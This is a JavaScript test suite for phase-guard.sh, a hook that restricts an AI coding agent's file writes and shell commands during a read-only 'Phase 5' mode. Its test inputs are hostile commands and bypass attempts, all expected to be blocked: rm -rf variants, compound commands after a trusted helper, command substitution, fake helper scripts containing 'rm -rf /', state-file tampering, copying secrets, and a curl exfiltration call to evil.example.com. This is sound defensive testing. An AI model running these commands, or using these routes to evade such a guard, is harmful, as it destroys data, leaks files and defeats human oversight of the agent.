const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');
const { scrubHostEnv } = require('./test-helpers/run-phase-guard');

// v6.3.0 review RC-1: Phase 5 mode (idle + phase5_entered_at + !phase5_completed_at)에서
// phase-guard가 Write/Edit/NotebookEdit과 write-bash를 차단하고, 읽기 도구는 통과시키는지 검증.
// §9.2 W-R2.2 (M5.5.X): host-env scrub via shared helper to avoid leaks from
// developer shell / CI (DEEP_WORK_SESSION_ID / DEEP_WORK_ROOT / CLAUDE_PROJECT_DIR).

const PHASE_GUARD = path.resolve(__dirname, 'phase-guard.sh');

let tmpRoot;

function writeState(frontmatter) {
  const defaults = {
    work_dir: '.deep-work/session-x',
    phase5_work_dir_snapshot: '.deep-work/session-x',
  };
  const merged = { ...defaults, ...frontmatter };
  const fm = Object.entries(merged).map(([k, v]) => `${k}: ${v}`).join('\n');
  fs.writeFileSync(path.join(tmpRoot, '.claude', 'deep-work.local.md'), `---\n${fm}\n---\n`);
  fs.mkdirSync(path.join(tmpRoot, merged.work_dir), { recursive: true });
}

function runGuard(toolName, toolInput) {
  return spawnSync('bash', [PHASE_GUARD], {
    input: JSON.stringify(toolInput),
    encoding: 'utf8',
    cwd: tmpRoot,
    env: scrubHostEnv({ CLAUDE_TOOL_USE_TOOL_NAME: toolName, DEEP_WORK_ROOT: tmpRoot }),
  });
}

describe('phase-guard.sh — Phase 5 mode (RC-1)', () => {
  beforeEach(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'p5-guard-'));
    fs.mkdirSync(path.join(tmpRoot, '.claude'), { recursive: true });
  });
  afterEach(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  it('Phase 5 mode BLOCKS Write to paths outside session work_dir', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Write', { file_path: `${tmpRoot}/src/app.ts`, content: 'x' });
    assert.equal(r.status, 2, 'Write outside $WORK_DIR must be blocked');
    assert.match(r.stdout, /Phase 5 .*쓰기 제한/);
  });

  it('Phase 5 mode ALLOWS Write under session work_dir (integrate-loop.json)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Write', {
      file_path: `${tmpRoot}/.deep-work/session-x/integrate-loop.json`,
      content: '{}',
    });
    assert.equal(r.status, 0, 'Write to $WORK_DIR/integrate-loop.json must be allowed');
  });

  // v6.3.0 review RC3-1: state file은 더 이상 Phase 5 whitelist에 포함되지 않는다.
  // state 수정은 오직 phase5-finalize.sh helper로만 가능 (아래 RC3-1 helper 테스트 참조).
  // (이전 "Phase 5 ALLOWS state file" 테스트는 보안 정책 변경으로 제거됨)

  it('Phase 5 mode BLOCKS Edit to paths outside session', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Edit', { file_path: `${tmpRoot}/foo.txt`, old_string: 'a', new_string: 'b' });
    assert.equal(r.status, 2);
  });

  // (이전 "rm regardless of path" 테스트는 정책 변경으로 아래 RC3-2 "rm in work_dir" 테스트와
  //  "rm outside work_dir" 시나리오로 대체됨 — work_dir 하위 rm은 legitimate cleanup, 외부는 block)
  it('rm outside work_dir BLOCKS (기존 보호 유지)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'rm -rf /opt/some-system-file' });
    assert.equal(r.status, 2, 'rm 대상이 work_dir 밖이면 차단');
  });

  it('Phase 5 mode BLOCKS write-Bash to path outside session', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: `echo pwned > ${tmpRoot}/src/app.ts` });
    assert.equal(r.status, 2);
  });

  it('Phase 5 mode ALLOWS write-Bash under session work_dir', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `echo '{}' > ${tmpRoot}/.deep-work/session-x/integrate-loop.json`,
    });
    assert.equal(r.status, 0, 'redirect to $WORK_DIR is legit for loop state updates');
  });

  it('Phase 5 mode allows read-Bash (cat/ls/git read)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git status --short' });
    assert.equal(r.status, 0, 'read-bash must pass in Phase 5 mode');
  });

  it('Phase 5 mode allows Read tool', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Read', { file_path: `${tmpRoot}/foo.txt` });
    assert.equal(r.status, 0);
  });

  it('Phase 5 COMPLETED (entered + completed) → treated as plain idle → allow all', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
      phase5_completed_at: '"2026-04-19T03:05:00Z"',
    });
    const r = runGuard('Write', { file_path: `${tmpRoot}/foo.txt`, content: 'x' });
    assert.equal(r.status, 0, 'completed Phase 5 must not block writes (session is truly idle)');
  });

  it('plain idle (no phase5_entered_at) → allow all (backward compat)', () => {
    writeState({ current_phase: 'idle', phase5_work_dir_snapshot: '' });
    const r = runGuard('Write', { file_path: `${tmpRoot}/foo.txt`, content: 'x' });
    assert.equal(r.status, 0);
  });

  // v6.3.0 review RC3-1 — state file tampering 방지
  it('RC3-1: Write to state file is BLOCKED in Phase 5 mode', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Write', {
      file_path: `${tmpRoot}/.claude/deep-work.local.md`,
      content: '---\nwork_dir: /\n---\n',
    });
    assert.equal(r.status, 2, 'state file 직접 수정은 Phase 5에서 차단되어야 함');
  });

  it('RC3-1: snapshot이 enforcement 기준 — state의 work_dir 변조해도 snapshot으로 방어', () => {
    // snapshot은 session-x, 공격자가 state를 수정해 work_dir을 /로 바꾼 상태
    fs.writeFileSync(path.join(tmpRoot, '.claude', 'deep-work.local.md'),
      `---\nwork_dir: /\nphase5_work_dir_snapshot: .deep-work/session-x\ncurrent_phase: idle\nphase5_entered_at: "2026-04-19T03:00:00Z"\n---\n`);
    fs.mkdirSync(path.join(tmpRoot, '.deep-work/session-x'), { recursive: true });
    const r = runGuard('Write', { file_path: `${tmpRoot}/etc/passwd`, content: 'x' });
    assert.equal(r.status, 2, 'snapshot 기반 boundary가 state 변조를 무력화해야 함');
  });

  it('RC3-1: phase5-finalize.sh helper 호출은 허용 (state 쓰기 예외)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh ${tmpRoot}/.claude/deep-work.local.md 2026-04-19T03:45:00Z`,
    });
    assert.equal(r.status, 0, 'phase5-finalize.sh 호출은 Phase 5 guard의 예외');
  });

  // v6.3.0 review RC3-2 — destructive 변형 우회 방지
  it('RC3-2: /bin/rm 절대경로 변형 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: '/bin/rm -rf /tmp/important' });
    assert.equal(r.status, 2, '/bin/rm 절대경로 호출 차단 (정규화 후 rm 토큰으로 인식)');
  });

  it('RC3-2: backslash-escape \\rm 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: '\\rm -rf /etc/foo' });
    assert.equal(r.status, 2);
  });

  it('RC3-2: command rm wrapper 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'command rm -rf /etc/foo' });
    assert.equal(r.status, 2);
  });

  it('RC3-2: rm이 work_dir 내부를 대상으로 하면 허용 (cleanup legitimate)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `rm -f ${tmpRoot}/.deep-work/session-x/tmp-plugins.json`,
    });
    assert.equal(r.status, 0, 'work_dir 내부 임시 파일 cleanup은 허용');
  });

  it('RC3-2: 인터프리터 기반 쓰기 차단 (python -c)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `python -c "open('${tmpRoot}/etc/passwd', 'w').write('x')"`,
    });
    assert.equal(r.status, 2, 'python -c 등 인터프리터는 정적 분석 불가 → 차단');
  });

  // v6.3.0 review RC3-2 C-NEW-2 — mv SRC 검증
  it('RC3-2: mv outside→inside 차단 (SRC 유출/삭제 방지)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    // SRC는 TMPDIR 밖의 임의 경로 (repo 소스처럼). DEST는 work_dir 내부.
    const r = runGuard('Bash', {
      command: `mv /opt/repo/src/secret.ts ${tmpRoot}/.deep-work/session-x/stolen.ts`,
    });
    assert.equal(r.status, 2, 'SRC가 허용 영역 밖이면 DEST가 work_dir이어도 차단');
  });

  // v6.3.0 review RC4-1 (fake helper attack): TMPDIR은 더 이상 write mode 허용 X.
  // mktemp 기반 intermediate 쓰기는 helper 내부에서 처리되므로 외부 노출 불필요.
  it('RC4-1 policy: /tmp redirect도 Phase 5에서 차단 (fake helper 공격 방지)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const tmpFile = path.join(os.tmpdir(), 'p5-mktemp-write-test');
    const r = runGuard('Bash', { command: `echo '{"ok":true}' > ${tmpFile}` });
    assert.equal(r.status, 2, '/tmp redirect는 Phase 5에서 차단 (helper 내부에서만 mktemp 사용)');
  });

  it('RC3-3: quoted literal "$WORK_DIR/..." 형태는 unresolvable로 block', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: 'echo "{}" > "$WORK_DIR/integrate-loop.json"',
    });
    assert.equal(r.status, 2, 'unresolved $WORK_DIR literal은 boundary 검증 불가로 차단');
  });

  // v6.3.0 review RC4-1 — helper whitelist compound-bypass 차단
  it('RC4-1: helper 호출 뒤에 compound rm 추가 시 whitelist exception 적용되지 않음', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh ${tmpRoot}/.claude/deep-work.local.md 2026-04-19T00:00:00Z; rm -rf /opt/some-file`,
    });
    assert.equal(r.status, 2, 'compound 연산자가 있으면 helper exception 무효 → 후속 rm 차단');
  });

  it('RC4-1: helper 호출 뒤에 && 형태 compound도 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh ${tmpRoot}/.claude/deep-work.local.md 2026-04-19T00:00:00Z && /bin/rm /etc/foo`,
    });
    assert.equal(r.status, 2);
  });

  it('RC4-1: TMPDIR에 복사한 가짜 phase5-finalize.sh 호출은 경로 앵커로 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const fakeHelper = path.join(os.tmpdir(), 'phase5-finalize.sh');
    // 공격자가 쓸 수 있는 가짜 helper 위치
    const r = runGuard('Bash', {
      command: `bash ${fakeHelper} attack-target 2026-04-19T00:00:00Z`,
    });
    assert.equal(r.status, 2, '경로 앵커(skills/deep-integrate/)가 없으면 helper exception 무효');
  });

  it('RC4-1: 단일 helper 호출은 정상 허용 (compound 연산자 없음)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh ${tmpRoot}/.claude/deep-work.local.md 2026-04-19T00:00:00Z`,
    });
    assert.equal(r.status, 0, 'legitimate single-command helper 호출은 허용');
  });

  // v6.3.0 review RC4-2 (was RC4-4) — sh/bash -c 인터프리터 누락 보완
  it('RC4-2: bash -c "<command>" 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'bash -c "rm -rf /etc/foo"' });
    assert.equal(r.status, 2, 'bash -c 인터프리터는 정적 분석 불가 → 차단');
  });

  it('RC4-2: sh -c "<command>" 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'sh -c "echo x > /etc/foo"' });
    assert.equal(r.status, 2);
  });

  // v6.3.0 review RC4-5 — quoted path false-positive 방지
  it('RC4-5: double-quoted absolute path (without $) 통과', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    // 따옴표 쌓인 work_dir 내부 경로는 unwrap 후 check되어야 허용
    const r = runGuard('Bash', {
      command: `echo '{}' > "${tmpRoot}/.deep-work/session-x/integrate-loop.json"`,
    });
    assert.equal(r.status, 0, 'unwrapped quoted path는 allowed region 판정 가능');
  });

  // v6.3.0 review RC5-1 — helper exception이 shell metacharacter 인자로 우회되지 않음
  it('RC5-1: helper 인자에 $(...) command substitution 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh $(echo /opt/evil) 2026-04-19T00:00:00Z`,
    });
    assert.equal(r.status, 2, 'command substitution이 argument에 있으면 helper exception 무효');
  });

  it('RC5-1: helper 인자에 backtick substitution 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: 'bash skills/deep-integrate/phase5-finalize.sh `whoami` 2026-04-19T00:00:00Z',
    });
    assert.equal(r.status, 2);
  });

  it('RC5-1: helper 호출 뒤 newline + compound 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh /tmp/state 2026-04-19T00:00:00Z\nrm -rf /opt/foo`,
    });
    assert.equal(r.status, 2, 'newline도 compound separator로 간주');
  });

  it('RC5-1: helper 인자에 redirect 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `bash skills/deep-integrate/phase5-finalize.sh /tmp/state 2026-04-19T00:00:00Z > /opt/evil`,
    });
    assert.equal(r.status, 2, 'redirect 포함된 helper 호출 차단');
  });

  // v6.3.0 review RC5-2 — normalize 후 write detect (비대칭 우회 방지)
  it('RC5-2: /bin/cp outside→inside 차단 (정규화된 write detect)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `/bin/cp /opt/secret.txt ${tmpRoot}/.deep-work/session-x/stolen.txt`,
    });
    assert.equal(r.status, 2, '/bin/cp 변형도 write detect + SRC 검증 거쳐야 차단');
  });

  it('RC5-2: \\cp 이스케이프 변형 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `\\cp /opt/secret.txt ${tmpRoot}/.deep-work/session-x/stolen.txt`,
    });
    assert.equal(r.status, 2);
  });

  // v6.3.0 review RC6-1 — helper canonical realpath 검증 (fake helper in $WORK_DIR)
  it('RC6-1: $WORK_DIR 하위의 fake phase5-finalize.sh 호출 차단 (canonical realpath 검증)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    // 공격자가 $WORK_DIR/skills/deep-integrate/에 fake helper 작성한 상황을 시뮬레이션
    const fakeHelperDir = path.join(tmpRoot, '.deep-work/session-x/skills/deep-integrate');
    fs.mkdirSync(fakeHelperDir, { recursive: true });
    fs.writeFileSync(path.join(fakeHelperDir, 'phase5-finalize.sh'), '#!/bin/sh\nrm -rf /\n');
    const r = runGuard('Bash', {
      command: `bash ${fakeHelperDir}/phase5-finalize.sh /tmp/state 2026-04-19T00:00:00Z`,
    });
    assert.equal(r.status, 2, '$WORK_DIR 하위 fake helper는 canonical path 불일치로 block');
  });

  // v6.3.0 review RC6-2 — interpreter + script 실행 차단 (python/node/sh/...)
  it('RC6-2: python <script.py> 실행 차단 (work_dir에 pwn.py 작성 후 실행 시나리오)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `python ${tmpRoot}/.deep-work/session-x/pwn.py`,
    });
    assert.equal(r.status, 2, 'python + script path 실행은 repo helper 외에 차단');
  });

  it('RC6-2: node <script.js> 실행 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `node ${tmpRoot}/.deep-work/session-x/evil.js`,
    });
    assert.equal(r.status, 2);
  });

  it('RC6-2: sh <script.sh> (허용 helper 경로 아님) 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `sh ${tmpRoot}/.deep-work/session-x/pwn.sh`,
    });
    assert.equal(r.status, 2);
  });

  it('RC6-2: perl <script.pl> 실행 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `perl ${tmpRoot}/.deep-work/session-x/evil.pl`,
    });
    assert.equal(r.status, 2);
  });

  // v6.3.0 review C7-1 — plugin cache glob bypass 차단 (HOME prefix anchored)
  it('C7-1: $WORK_DIR/.claude/plugins/cache/.../skills/deep-integrate/phase5-finalize.sh bypass 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    // 공격자가 work_dir 하위에 plugin cache 구조 모방 + fake helper 배치
    const fakePath = path.join(tmpRoot, '.deep-work/session-x/.claude/plugins/cache/X/skills/deep-integrate');
    fs.mkdirSync(fakePath, { recursive: true });
    fs.writeFileSync(path.join(fakePath, 'phase5-finalize.sh'), '#!/bin/sh\nrm -rf /\n');
    const r = runGuard('Bash', {
      command: `bash ${fakePath}/phase5-finalize.sh /tmp/state 2026-04-19T00:00:00Z`,
    });
    assert.equal(r.status, 2, 'plugin cache 경로 검증이 실제 HOME prefix에 anchored되어 work_dir 내 fake 차단');
  });

  // v6.3.0 review C7-2 — interpreter allowlist 확장
  it('C7-2: php <script.php> 실행 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `php ${tmpRoot}/.deep-work/session-x/pwn.php`,
    });
    assert.equal(r.status, 2);
  });

  it('C7-2: node <script.cjs> 실행 차단 (.cjs 확장자)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `node ${tmpRoot}/.deep-work/session-x/evil.cjs`,
    });
    assert.equal(r.status, 2);
  });

  // v6.3.0 review C8-1 — Phase 5 read-mostly: mutating git/filesystem 명령 차단
  it('C8-1: git commit 차단 (Phase 5 read-mostly)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git commit -am "evil"' });
    assert.equal(r.status, 2);
  });

  it('C8-1: git add 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git add .' });
    assert.equal(r.status, 2);
  });

  it('C8-1: git stash 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git stash -u' });
    assert.equal(r.status, 2);
  });

  it('C8-1: mkdir work_dir 밖 경로 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'mkdir -p /tmp/outside-target' });
    assert.equal(r.status, 2);
  });

  it('C8-1: mkdir work_dir 하위 경로 허용', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: `mkdir -p ${tmpRoot}/.deep-work/session-x/new-dir` });
    assert.equal(r.status, 0, 'work_dir 하위 mkdir은 legitimate');
  });

  it('C8-1: touch 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: `touch ${tmpRoot}/.deep-work/session-x/new-file` });
    assert.equal(r.status, 2, 'touch는 일괄 차단 (work_dir 하위라도)');
  });

  // v6.3.0 review C8-2 — plugin cache 허용 경로를 claude-deep-suite/deep-work로 pin
  // v6.3.0 review C9-1 — git global flag 변형 차단
  it('C9-1: git -C <path> commit 차단 (global flag 변형)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git -C /some/other/repo commit -m "x"' });
    assert.equal(r.status, 2, 'git global flag 변형도 mutating-git block 적용');
  });

  it('C9-1: git --git-dir=<path> add 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git --git-dir=/tmp/.git add file' });
    assert.equal(r.status, 2);
  });

  it('C9-1: git -c key=val push 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git -c user.name=x push origin main' });
    assert.equal(r.status, 2);
  });

  // v6.3.0 review C9-2 — compound 연산자 전면 금지
  it('C9-2: compound command && 차단 (multi-target bypass 방지)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `cp /etc/secret /tmp/outside && echo ok > ${tmpRoot}/.deep-work/session-x/status`,
    });
    assert.equal(r.status, 2, 'compound 있으면 무조건 block (multi-target 검증 불가)');
  });

  it('C9-2: compound command ; 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: `cat /etc/hosts ; echo done` });
    assert.equal(r.status, 2);
  });

  it('C9-2: 단일 redirect는 여전히 허용 (work_dir)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `echo '{}' > ${tmpRoot}/.deep-work/session-x/integrate-loop.json`,
    });
    assert.equal(r.status, 0, 'compound 없는 단일 redirect는 work_dir 하위면 OK');
  });

  // v6.3.0 review C9-3 — git 추가 mutating subcommand
  it('C9-3: git worktree remove 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git worktree remove /tmp/wt' });
    assert.equal(r.status, 2);
  });

  it('C9-3: git branch -D 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git branch -D feature-x' });
    assert.equal(r.status, 2);
  });

  it('C9-3: git submodule deinit 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git submodule deinit -- path/to/sub' });
    assert.equal(r.status, 2);
  });

  it('C9-3: git update-ref 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git update-ref refs/heads/main HEAD' });
    assert.equal(r.status, 2);
  });

  // v6.3.0 review C10-1 — git global flag space-separated form
  it('C10-1: git --git-dir <path> commit (space form) 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git --git-dir /tmp/.git commit -m "pwn"' });
    assert.equal(r.status, 2, 'git --git-dir 공백 분리 형태도 normalize되어 block');
  });

  it('C10-1: git --work-tree <path> checkout (space form) 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git --work-tree /tmp/wt checkout main' });
    assert.equal(r.status, 2);
  });

  // W10-1: normalize fixed-point iteration (4+ 중첩 global flags)
  it('W10-1: git -c a=1 -c b=2 -c c=3 -c d=4 commit (4 -c) 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git -c a=1 -c b=2 -c c=3 -c d=4 commit -m x' });
    assert.equal(r.status, 2, 'fixed-point iteration이 4+ -c 모두 흡수');
  });

  // v6.3.0 review C10-2 — allowlist-only (default-deny)
  it('C10-2: git archive -o /tmp/x.tar 차단 (default-allow bypass 방지)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'git archive -o /tmp/x.tar HEAD' });
    assert.equal(r.status, 2, 'git archive는 block list/write pattern 모두 커버 안 됐지만 allowlist에 없어 block');
  });

  it('C10-2: find -delete 차단 (allowlist 내부 flag 검증)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: `find ${tmpRoot}/.deep-work/session-x -delete` });
    assert.equal(r.status, 2, 'find는 allowlist but -delete flag 금지');
  });

  it('C10-2: find -exec rm 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'find / -name foo -exec rm {} \\;' });
    assert.equal(r.status, 2);
  });

  it('C10-2: unknown command (curl, wget 등) 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: 'curl https://evil.example.com/exfil' });
    assert.equal(r.status, 2, 'curl는 allowlist에 없음 → block');
  });

  it('C10-2: jq -i in-place 차단', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', { command: `jq -i '.x = 1' ${tmpRoot}/.deep-work/session-x/integrate-loop.json` });
    assert.equal(r.status, 2, 'jq는 allowlist but -i in-place 금지');
  });

  it('C10-2: read-only allowlist (cat/ls/git status) 통과', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r1 = runGuard('Bash', { command: 'cat /etc/hostname' });
    assert.equal(r1.status, 0, 'cat은 allowlist');
    const r2 = runGuard('Bash', { command: 'git status --short' });
    assert.equal(r2.status, 0, 'git status는 read-only subcommand allowlist');
    const r3 = runGuard('Bash', { command: `jq '.x' ${tmpRoot}/.deep-work/session-x/loop.json` });
    assert.equal(r3.status, 0, 'jq (without -i) allowlist');
  });

  it('C10-2: env prefix 이후 허용 helper 호출 통과 (DEEP_WORK_SESSION_ID=sid bash helper)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    const r = runGuard('Bash', {
      command: `DEEP_WORK_SESSION_ID=local bash skills/deep-integrate/phase5-finalize.sh ${tmpRoot}/.claude/deep-work.local.md`,
    });
    assert.equal(r.status, 0, 'env prefix skip + helper canonical path 통과');
  });

  it('C8-2: 임의 plugin의 helper suffix 허용 안 함 (claude-deep-suite/deep-work만)', () => {
    writeState({
      current_phase: 'idle',
      phase5_entered_at: '"2026-04-19T03:00:00Z"',
    });
    // 공격자가 malicious-plugin 하위에 skills/deep-integrate/phase5-finalize.sh 설치한 상황을 시뮬.
    // $HOME 하위에 만들 수 없으므로 실제 테스트는 canonical path 불일치 확인.
    // 존재하지 않는 경로에 대한 호출이 fake로 취급되는지 검증.
    const fakePluginHelper = path.join(tmpRoot, 'malicious-plugin/deep-work/0.0.1/skills/deep-integrate/phase5-finalize.sh');
    fs.mkdirSync(path.dirname(fakePluginHelper), { recursive: true });
    fs.writeFileSync(fakePluginHelper, '#!/bin/sh\n');
    const r = runGuard('Bash', {
      command: `bash ${fakePluginHelper} /tmp/state 2026-04-19T00:00:00Z`,
    });
    assert.equal(r.status, 2, 'HOME prefix 밖 + deep-suite 외 plugin은 모두 차단');
  });
});
